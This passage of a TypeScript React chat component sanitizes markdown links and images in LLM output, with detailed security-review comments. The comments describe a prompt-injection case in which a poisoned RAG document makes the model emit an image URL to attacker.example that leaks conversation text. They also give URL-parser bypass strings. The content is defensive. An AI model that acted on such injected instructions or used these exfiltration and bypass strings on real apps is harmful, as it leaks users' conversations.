 *  the count (chat-prototype-port:AC-43's closing clause). Call only with a value
 *  `isValidSourceList` accepted. */
function uniqueSourceDocuments(sources: ChatSource[]): ChatSource[] {
  const seen = new Set<string>();
  return sources.filter((source) => {
    if (seen.has(source.documentId)) return false;
    seen.add(source.documentId);
    return true;
  });
}

/** True only for an array whose every element has at least the shape the chip renderer,
 *  `<li>` key builder, and `uniqueSourceDocuments` above actually read (`filename`,
 *  `documentId`, plus the wire-contract `page` field kept validated even though the display
 *  no longer renders it) -- guards
 *  against a wire-contract violation like `sources: [null]` reaching `.map` (review 2026-08-31
 *  round-2 security Low-1). */
function isValidSourceList(sources: unknown): sources is ChatSource[] {
  return (
    Array.isArray(sources) &&
    sources.every(
      (s) =>
        typeof s === "object" &&
        s !== null &&
        typeof (s as ChatSource).filename === "string" &&
        typeof (s as ChatSource).documentId === "string" &&
        ((s as ChatSource).page === null || typeof (s as ChatSource).page === "number"),
    )
  );
}

/**
 * [Purpose] The two overrides on top of react-markdown's safe defaults: (1) adds
 *   `target="_blank" rel="noopener noreferrer"` to rendered links (react-markdown does not
 *   do this on its own) and refuses to render a non-http(s)/mailto/in-page `href` as a
 *   clickable link at all; (2) refuses to render a markdown image (`![alt](src)`) as a live
 *   `<img>` unless its `src` is same-origin-relative, falling back to the alt text instead.
 *   ({@link isSafeImageSrc} also allow-lists `data:` -- see its own [Caution] for why that
 *   branch does not currently change this component's actual rendered output.)
 * [Rationale] `react-markdown`'s own default `urlTransform` already strips dangerous
 *   protocols from `href`/`src` (allow-list: http, https, irc, ircs, mailto, xmpp, and
 *   relative URLs -- see its README's "Security"/`defaultUrlTransform` sections), so
 *   {@link isSafeHref}/{@link isSafeImageSrc} here are defense in depth, not the only
 *   guard: even if a future dependency bump ever changed that default, a `javascript:`
 *   href is still rendered as inert text, and an `http(s)` image `src` is still rendered
 *   as inert alt text, never as a live element.
 *   The `img` override exists specifically because `urlTransform` allows `http`/`https`
 *   for images (review 2026-08-29 High-2): an assistant message is LLM output driven by
 *   the RAG corpus, and `POST /api/admin/documents` (see High-1 note above) accepts
 *   uploads without authentication, so a poisoned document could prompt-inject the model
 *   into emitting `![x](https://attacker.example/p.png?q=<conversation text>)`. Unlike a
 *   link, an `<img>` fires its GET the instant it renders -- no click needed -- so this is
 *   an exfiltration channel, not just a navigation risk, and is closed at the component
 *   level (belt) with a matching CSP `img-src` (suspenders, see `next.config.ts`).
 *   {@link isSafeImageSrc} is a separate function from {@link isSafeHref} rather than a
 *   shared helper because their allow-lists are legitimately different: a link may
 *   usefully point at any http(s) URL or `mailto:` (the user must still click it), but an
 *   image allow-list that included `http(s)` would defeat the very protection this
 *   override exists for.
 * [Caution] Do not add `rehype-raw` or pass raw HTML through `dangerouslySetInnerHTML`
 *   anywhere in this tree -- `message.content` for an assistant message is LLM output,
 *   untrusted input in this project's RAG design (card F2 brief).
 * [AC] chat:AC-37
 */
const markdownComponents: Components = {
  a({ href, children }) {
    if (!href || !isSafeHref(href)) {
      return <span>{children}</span>;
    }
    return (
      <a href={href} target="_blank" rel="noopener noreferrer">
        {children}
      </a>
    );
  },
  img({ src, alt }) {
    // `src`'s type includes React 19's experimental non-string `img` source values (e.g.
    // `Blob`) alongside `string | undefined` -- markdown/`react-markdown` only ever produces
    // a string URL here, so anything else is treated the same as "missing/unsafe".
    if (typeof src !== "string" || !isSafeImageSrc(src)) {
      return <span>{alt ?? ""}</span>;
    }
    // `src` here is an arbitrary, untrusted markdown URL (gated by isSafeImageSrc above);
    // next/image's static domain allow-list config does not fit a value that is only
    // known at render time.
    // eslint-disable-next-line @next/next/no-img-element
    return <img src={src} alt={alt ?? ""} />;
  },
};

/**
 * [Purpose] Link `href` allow-list: same-origin-relative paths, in-page anchors,
 *   `https?:`, and `mailto:`.
 * [Rationale] review 2026-08-29 Low-2: the previous regex's bare `\/` alternative also
 *   matched protocol-relative URLs (`//attacker.example/x`, which browsers resolve using
 *   the *current* scheme against a *different* host) because they too start with a single
 *   `/` character. The negative lookahead `/^\/(?!\/)/` fixed that one shape but review
 *   2026-08-29 Medium-1 (later withdrawn -- see {@link isSameOriginRelative}'s [Caution])
 *   raised two more shapes a regex can't see: (1) in the URL/WHATWG parser, `\` is treated
 *   the same as `/` for special schemes, so `/\attacker.example/p.png` would be
 *   host-override-equivalent to `//attacker.example/p.png` and the lookahead would never
 *   trigger because the second character isn't literally `/`; (2) the parser strips ASCII
 *   TAB/CR/LF from anywhere in the URL before resolving it, while `.trim()` only trims the
 *   two ends, so a CommonMark `<...>`-delimited destination carrying an embedded TAB (e.g.
 *   `</\t/attacker.example/p.png>`) would also slip past -- *if* either reached this
 *   function in that unnormalized form, which they do not in the shipped pipeline (see
 *   {@link isSameOriginRelative}'s [Caution]). Delegating to {@link isSameOriginRelative}
 *   fixes both anyway: it resolves the candidate with the same WHATWG `URL` parser the
 *   browser itself uses and compares the resulting *origin*, so it inherits the browser's
 *   own `\`-as-`/` and control-character handling instead of trying to out-guess them with
 *   a second regex -- this stays correct as defense in depth even though the two shapes
 *   above are not reachable today.
 * [Caution] Keep this in sync with {@link isSafeImageSrc} only where the two genuinely
 *   overlap (the relative-path check, both delegate to {@link isSameOriginRelative}); do
 *   not merge their http(s) handling -- see the [Rationale] on {@link markdownComponents}
 *   for why they differ there.
 */
function isSafeHref(href: string): boolean {
  const trimmed = href.trim();
  return /^(https?:|mailto:|#)/i.test(trimmed) || isSameOriginRelative(trimmed);
}

/**
 * [Purpose] Image `src` allow-list: same-origin-relative paths (delegates to
 *   {@link isSameOriginRelative}, shared with {@link isSafeHref} -- see its [Rationale] for
 *   why a parser is used instead of a regex) and `data:` URIs. Deliberately excludes
 *   `https?:` and `mailto:`.
 * [Rationale] AC chat:AC-37's markdown rendering exists to display assistant text, not to
 *   fetch third-party resources. An `<img>` loads unconditionally on render (no user
 *   click), so allowing arbitrary `http(s)` here -- as {@link isSafeHref} does for links --
 *   would reopen exactly the exfiltration channel this override exists to close (see
 *   review 2026-08-29 High-2, and the [Rationale] on {@link markdownComponents}).
 * [Caution] The `data:` branch is currently unreachable via markdown image syntax
 *   (`![alt](src)`) in the shipped `react-markdown@10.1.0`: its own `defaultUrlTransform`
 *   (`safeProtocol` regex in `node_modules/react-markdown/lib/index.js`, allow-listing only
 *   `https?`/`ircs?`/`mailto`/`xmpp`) rewrites a `data:` URI to `""` *before*
 *   {@link markdownComponents}'s `img` override -- and therefore this function -- ever sees
 *   it; confirmed against that source and by `MessageList.test.tsx`'s "falls back to alt
 *   text for a data: URI markdown image" case (QA, review 2026-08-29 defect 2). This is not
 *   a bug -- an unreachable branch here is strictly more restrictive than the alternative,
 *   never less -- and the branch is kept rather than deleted as defense in depth against
 *   `react-markdown` changing `defaultUrlTransform`'s allow-list in a future version (at
 *   which point this function, not react-markdown's default, would become the only guard
 *   standing between a `data:` image and this app rendering it live). Do not describe this
 *   branch elsewhere as currently affecting rendered output -- it does not.
 */
function isSafeImageSrc(src: string): boolean {
  const trimmed = src.trim();
  return /^data:/i.test(trimmed) || isSameOriginRelative(trimmed);
}

/**
 * [Purpose] True when `candidate`, resolved as a URL, lands on the same origin as this
 *   app -- the shared same-origin test behind both {@link isSafeHref} and
 *   {@link isSafeImageSrc}'s relative-path branch.
 * [Rationale] review 2026-08-29 Medium-1 (later withdrawn -- see [Caution] below): a regex
 *   trying to recognize "starts with exactly one `/`" cannot see the WHATWG URL parser's
 *   own normalization (`\` folded to `/` for special schemes, ASCII TAB/CR/LF stripped from
 *   anywhere in the string) -- see the [Rationale] on {@link isSafeHref} for the three
 *   concrete bypass strings this would close if they ever reached this function in
 *   unnormalized form. Resolving `candidate` against a fixed, non-existent placeholder base
 *   (`http://x.invalid`) and comparing `origin` reuses the exact parser the browser itself
 *   applies before navigating/fetching, so this function can only be as wrong as the
 *   browser is, instead of a second, independent (and in this case looser) guess at the
 *   same rules. An absolute `http(s)://other-host/...` candidate correctly resolves to a
 *   different origin and is rejected here -- callers that want to allow `http(s)` do so via
 *   their own separate branch (see {@link isSafeHref}), not through this function.
 * [Caution] The placeholder base's scheme/host/port are arbitrary and never dereferenced --
 *   only used as the resolution anchor for relative candidates -- so they must stay fixed
 *   for the two `origin` values being compared to be meaningful. An empty `candidate` is
 *   rejected explicitly before resolution: `new URL("", placeholderBase)` resolves to the
 *   placeholder base itself, same origin by construction, which would otherwise make an
 *   empty `src`/`href` pass as "safe" -- react-markdown's own `defaultUrlTransform` rewrites
 *   a disallowed protocol (e.g. `data:` for an image) to exactly `""` rather than omitting
 *   the attribute, and `MessageList.test.tsx`'s data-URI case exercises this path directly.
 *
 *   As of today, in the shipped `react-markdown@10.1.0` pipeline, the three bypass strings
 *   named in this function's own [Rationale] and in {@link isSafeHref}'s [Rationale] do not
 *   reach this function in the unnormalized form those write-ups describe:
 *   `mdast-util-to-hast`'s `link`/`image` handlers run every destination through
 *   `micromark-util-sanitize-uri`'s `normalizeUri()` first, which percent-encodes `\`
 *   (0x5C) to `%5C` and TAB (0x09) to `%09` before this function ever sees the value. A
 *   percent-encoded `%5C`/`%09` is not treated as a path/host separator by the WHATWG `URL`
 *   parser, so both the old regex-based guard and this function already agree the encoded
 *   form is same-origin -- there is no live bypass to close today (coordinator-verified,
 *   `INC-016`). This function is kept anyway as defense in depth for if/when the upstream
 *   `normalizeUri` policy changes; do not describe it elsewhere as currently closing a
 *   reachable bypass -- it does not (compare {@link isSafeImageSrc}'s `data:` branch
 *   [Caution], which makes the same unreachable-but-kept argument for the same reason).
 */
function isSameOriginRelative(candidate: string): boolean {
  if (candidate.length === 0) return false;
  const placeholderBase = "http://x.invalid";
  try {
    return new URL(candidate, placeholderBase).origin === placeholderBase;
  } catch {
    return false;
  }
}
